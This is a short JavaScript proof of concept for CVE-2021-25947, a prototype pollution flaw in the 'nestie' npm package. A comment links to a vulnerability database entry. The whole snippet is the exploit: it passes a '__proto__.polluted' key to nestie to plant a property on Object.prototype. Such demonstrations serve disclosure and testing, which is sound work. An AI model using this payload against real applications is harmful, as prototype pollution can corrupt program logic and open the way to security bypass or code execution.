//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
    const { nestie } = require("nestie")
    obj = {}

    nestie({"__proto__.polluted": "yes"})
  

